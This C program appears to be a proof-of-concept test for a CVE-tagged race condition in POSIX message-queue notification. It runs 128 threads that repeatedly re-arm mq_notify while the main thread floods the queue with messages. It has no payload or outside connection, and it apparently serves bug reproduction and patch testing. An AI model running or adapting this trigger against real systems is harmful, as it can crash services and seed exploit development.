#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <mqueue.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <signal.h>
#include <errno.h>

#define NUM_THREADS 128       // Number of threads to create
#define MSG_SIZE 64           // Max size of each message
#define MSG_COUNT 100000      // Total number of messages to send and process

mqd_t mq;                     // Message queue descriptor (global)

// Handler function triggered when a message arrives in the queue
void on_message_received(union sigval sv) {
    mqd_t q = *(mqd_t *)sv.sival_ptr;

    char buf[MSG_SIZE + 1];                     // Buffer to hold message (with null terminator)
    ssize_t bytes = mq_receive(q, buf, sizeof(buf) - 1, NULL); // Receive a message from the queue
    if (bytes >= 0) {
        buf[bytes] = '\0';                      // Null-terminate the message
        printf("Handler got message: %s\n", buf); // Print the received message
        fflush(stdout);                         // Ensure immediate output
    } else {
        perror("mq_receive");                   // Print error if receive fails
    }
}

// Thread function that repeatedly re-registers for message queue notifications
void *rearm_thread(void *arg) {
    struct sigevent sev;
    sev.sigev_notify = SIGEV_THREAD;              // Notify via a new thread
    sev.sigev_notify_function = on_message_received; // Callback handler
    sev.sigev_value.sival_ptr = &mq;              // Pass message queue descriptor to handler
    sev.sigev_notify_attributes = NULL;           // Default thread attributes

    printf("Thread %lu started\n", (unsigned long)pthread_self());
    fflush(stdout);

    // Try to re-register the notification repeatedly
    for (int i = 0; i < MSG_COUNT; i++) {
        int ret = mq_notify(mq, &sev);            // Try to register for notification
        __sync_synchronize();                     // Memory barrier to sync across threads

        if (ret == -1 && errno != EBUSY) {        // If it fails and it's not just "already armed"
            perror("mq_notify");                  // Report error
            break;
        }
        usleep(1);                                // Small sleep to increase race condition likelihood
    }

    printf("Thread %lu finished\n", (unsigned long)pthread_self());
    fflush(stdout);
    return NULL;
}

int main() {
    struct mq_attr attr = {
        .mq_flags = 0,         // Flags (0 = blocking)
        .mq_maxmsg = 10,       // Max number of messages in queue at once
        .mq_msgsize = MSG_SIZE,// Max size per message
        .mq_curmsgs = 0,       // Initially 0 messages
    };

    // Open or create a message queue with read/write permissions
    mq = mq_open("/test_cve_33574", O_CREAT | O_RDWR, 0644, &attr);
    if (mq == (mqd_t)-1) {
        perror("mq_open");
        exit(EXIT_FAILURE);
    }

    pthread_t threads[NUM_THREADS];

    // Start NUM_THREADS threads, each trying to rearm mq_notify
    for (int i = 0; i < NUM_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, rearm_thread, NULL) != 0) {
            perror("pthread_create");
            mq_close(mq);
            mq_unlink("/test_cve_33574");
            exit(EXIT_FAILURE);
        }
    }

    // Main thread sends MSG_COUNT messages to the queue
    for (int i = 0; i < MSG_COUNT; i++) {
        char msg[MSG_SIZE];
        snprintf(msg, sizeof(msg), "Msg %d", i);   // Create message content

        // Send the message
        if (mq_send(mq, msg, strlen(msg) + 1, 0) == -1) {
            perror("mq_send");                     // Report if sending fails
        }

        usleep(10);                                // Small delay to increase concurrency
    }

    // Wait for all threads to finish before exiting
    for (int i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    mq_close(mq);                                   // Close message queue
    mq_unlink("/test_cve_33574");                   // Remove queue from system

    printf("Test completed.\n");
    fflush(stdout);
    return 0;
}
